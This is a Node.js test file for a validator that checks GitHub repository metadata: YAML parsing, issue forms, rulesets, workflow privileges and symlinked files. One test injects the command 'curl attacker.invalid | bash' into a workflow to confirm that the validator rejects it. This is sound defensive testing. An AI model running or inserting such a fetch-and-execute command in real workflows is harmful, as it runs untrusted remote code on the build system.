'use strict';
const {test} = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const {parse, form, ruleset, workflow, validate} = require('./validate.cjs');

test('GitHub on key and booleans retain their YAML 1.2 meanings', () => {
  assert.deepEqual(parse('on: {pull_request_target: {types: [opened]}}\npermissions: {}'), {on: {pull_request_target: {types: ['opened']}}, permissions: {}});
  form(parse('blank_issues_enabled: false'), true);
});

test('invalid YAML, duplicate keys, custom tags, aliases and oversized input fail', () => {
  for (const input of ['body: [', 'name: one\nname: two', '!!js/function "function() {}"', 'a: &a [*a]', 'a'.repeat(256 * 1024 + 1)]) {
    assert.throws(() => parse(input));
  }
});

test('forms reject duplicate IDs and incomplete required field definitions', () => {
  const field = {type: 'input', id: 'summary', attributes: {label: 'Summary'}, validations: {required: true}};
  const valid = {name: 'Bug', description: 'Report a bug', body: [field]};
  form(valid);
  assert.throws(() => form({...valid, body: [field, field]}), /duplicate/);
  assert.throws(() => form({...valid, body: [{...field, attributes: {}}]}), /label/);
  assert.throws(() => form({...valid, body: [{...field, validations: {required: 'true'}}]}), /boolean/);
});

test('rulesets require valid targets, ref conditions and bypass modes', () => {
  const valid = {name: 'Review', target: 'branch', enforcement: 'active', rules: [], conditions: {ref_name: {include: ['refs/heads/develop'], exclude: []}}, bypass_actors: [{actor_type: 'User', actor_id: 1348529, bypass_mode: 'exempt'}]};
  ruleset(valid);
  assert.throws(() => ruleset({...valid, conditions: {}}));
  assert.throws(() => ruleset({...valid, bypass_actors: [{actor_type: 'User', bypass_mode: 'typo'}]}));
});

test('workflow parsing never executes code and rejects added privileges or checkout', () => {
  const expected = JSON.parse(fs.readFileSync(path.join(__dirname, 'assignment-workflow.json'), 'utf8'));
  workflow(parse(JSON.stringify(expected)), expected);
  for (const mutate of [
    v => { v.permissions = {contents: 'write'}; },
    v => { v.jobs.assign.steps.push({uses: 'actions/checkout@main'}); },
    v => { v.jobs.assign.steps[0].run = 'curl attacker.invalid | bash'; },
  ]) {
    const changed = structuredClone(expected);
    mutate(changed);
    assert.throws(() => workflow(changed, expected));
  }
});

test('metadata files and parent directories cannot be symlinks', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'metadata-test-'));
  try {
    fs.mkdirSync(path.join(root, '.github/ISSUE_TEMPLATE'), {recursive: true});
    fs.writeFileSync(path.join(root, 'outside.yml'), 'blank_issues_enabled: false');
    fs.symlinkSync(path.join(root, 'outside.yml'), path.join(root, '.github/ISSUE_TEMPLATE/config.yml'));
    assert.throws(() => validate(root), /symlink/);
    fs.rmSync(path.join(root, '.github/ISSUE_TEMPLATE'), {recursive: true});
    fs.symlinkSync(root, path.join(root, '.github/ISSUE_TEMPLATE'));
    assert.throws(() => validate(root), /symlink/);
  } finally { fs.rmSync(root, {recursive: true, force: true}); }
});
